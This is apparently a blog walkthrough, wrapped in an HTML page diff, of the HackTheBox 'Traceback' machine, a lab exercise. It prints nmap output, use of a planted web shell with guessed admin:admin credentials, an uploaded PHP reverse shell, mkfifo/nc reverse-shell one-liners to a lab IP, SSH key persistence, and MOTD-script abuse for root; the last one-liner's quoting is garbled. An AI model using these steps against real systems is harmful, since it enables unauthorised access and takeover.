@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink, john tuyen, jtuyen" /> 
+
+<title>John Tuyen | Traceback</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Traceback"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-traceback/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Traceback" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gaze/ ">Gaze</a> 
+            <a 
+                href="https://johntuyen.com/wiretap/ ">Wiretap</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">17</span>
+        <span class="rest">Mar 20</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Traceback </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li><pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nmap -sC -sV -oA traceback 10.10.10.181
+</span></code></pre>
+<p><code>nmap</code> scans show scans show ports 22 and 80 is open.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-17 21:42 EDT
+</span><span>Failed to resolve &quot;nmap&quot;.
+</span><span>Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span><span>Service scan Timing: About 50.00% done; ETC: 21:42 (0:00:06 remaining)
+</span><span>Nmap scan report for 10.10.10.181
+</span><span>Host is up (0.032s latency).
+</span><span>Not shown: 998 closed ports
+</span><span>PORT   STATE SERVICE VERSION
+</span><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span>| ssh-hostkey: 
+</span><span>|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+</span><span>|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+</span><span>|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+</span><span>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span><span>|_http-title: Help us                                                         
+</span></code></pre>
+</li>
+<li>
+<p>Enumeration of port 80 shows a single page. I began running <code>gobuster</code> and <code>nikto</code> but no results.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-1.png" alt="htb-traceback-1.png" /></p>
+<p>In the source page, there is a line that mentions:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;!--Some of the best web shells that you might need ;)--&gt;
+</span></code></pre>
+<p>Google shows up with a repository that contains many web shells.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>https://github.com/TheBinitGhimire/Web-Shells
+</span></code></pre>
+<p>I tried the entire list of filenames and smevk.php worked.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://traceback/smevk.php
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-2.png" alt="htb-traceback-2.png" /></p>
+<p>I basically guessed admin:admin and it worked.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-3.png" alt="htb-traceback-3.png" /></p>
+</li>
+<li>
+<p>After playing around with the web shell and understanding the capabilities, there was a file manager that can be utilized to upload a reverse shell script. I Googled for a PHP reverse shell and came upon the gold standard of PHP scripts:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</span></code></pre>
+<p>Once it was uploaded, it was a matter of executing the script by navigating the URL:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://traceback/rs.php
+</span></code></pre>
+</li>
+<li>
+<p>Now that I have a low privilege shell access, I began lurking around to see what I can find. I noticed there was a note.txt file in the <code>/home/webadmin/</code> directory.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-4.png" alt="htb-traceback-4.png" /></p>
+<p>I took a look at the <code>.bash_history</code> file to see if there were past commands that would assist with privilege escalation.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-5.png" alt="htb-traceback-5.png" /></p>
+<p>The <code>sudo</code> command is definitely not right so I looked into the current privileges I had with <code>webadmin</code> account.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-6.png" alt="htb-traceback-6.png" /></p>
+</li>
+<li>
+<p>Knowing what privileges I had, I knew what I had to do going forward. I Googled for a way to execute operating system commands in LUA language to create a reverse shell connection. I Googled for an LUA based reverse shell and combined with a bourne reverse shell one liner.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>require(&#39;os&#39;);
+</span><span>os.execute(&#39;sh -c rm /tmp/abc;mkfifo /tmp/abc;cat /tmp/abc|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.45 4445 &gt;/tmp/abc&#39;);
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-7.png" alt="htb-traceback-7.png" /></p>
+</li>
+<li>
+<p>Setup a netcat listener and execute the <code>sudo</code> command. User flag has been obtained.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-8.png" alt="htb-traceback-8.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-9.png" alt="htb-traceback-9.png" /></p>
+</li>
+</ol>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ol>
+<li>
+<p>As a convenience for myself, I added my own SSH key to the <code>authorized_keys</code> file so I can easily SSH into the machine and have a proper shell.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-10.png" alt="htb-traceback-10.png" /></p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ssh -i ~/.ssh/id_rsa sysadmin@traceback
+</span></code></pre>
+</li>
+<li>
+<p>I ran the standard linux enumeration scripts, <code>Linpeas</code> and <code>PSPY64</code>. The <code>Linpeas</code> results showed a lot of interesting results but didn't notice anything too interesting until I ran <code>PSPY64</code>. <code>PSPY64</code> found a <code>cron</code> job that was running every 30 seconds or so and was related to MOTD. Once I noticed these processes, I figured it was related to some kind of MOTD abuse.</p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-11.png" alt="htb-traceback-11.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-12.png" alt="htb-traceback-12.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-13.png" alt="htb-traceback-13.png" /></p>
+</li>
+<li>
+<p><code>Linpeas</code> show that <code>sysadmin</code> had access to modify <code>00-header</code> file which controls the MOTD when you log in via SSH. I decided to insert the reverse shell one liner that I did before. Next time when I logged into SSH, the machine should execute the MOTD file along with my command. Root flag has been obtained.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>sh -c rm /tmp/abc;mkfifo /tmp/abc;cat /tmp/abc|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.45 4446 &gt;/tmp/abc&#39;);
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-14.png" alt="htb-traceback-14.png" /></p>
+<p><img src="https://johntuyen.com/posts/htb-traceback/htb-traceback-15.png" alt="htb-traceback-15.png" /></p>
+</li>
+</ol>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/johntuyenprotonmailcom-pgp.asc" title="PGP" rel="me">
+                        <i data-feather="lock"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
